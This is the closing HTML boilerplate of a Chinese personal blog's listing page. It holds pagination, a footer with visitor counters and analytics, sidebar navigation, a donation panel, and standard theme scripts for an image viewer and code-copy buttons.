  <nav class="page-nav">
    
    <a class="extend prev" rel="prev" href="/">上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/">下一页</a>
  </nav>
  
</section>
</div>

      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2015-2023
        <i class="ri-heart-fill heart_icon"></i> n0rt6
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/ayer-side.svg" alt="n0rt6&#39;s bolg"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags/%E6%97%85%E8%A1%8C/">旅行</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" target="_blank" rel="noopener" href="http://shenyu-vip.lofter.com">摄影</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/friends">友链</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/2019/about">关于我</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="/images/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->

<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->
 
<script src="/js/busuanzi-2.3.pure.min.js"></script>
 
<!-- ClickLove -->

<!-- ClickBoom1 -->

<!-- ClickBoom2 -->

<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->

<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div>
</body>

</html>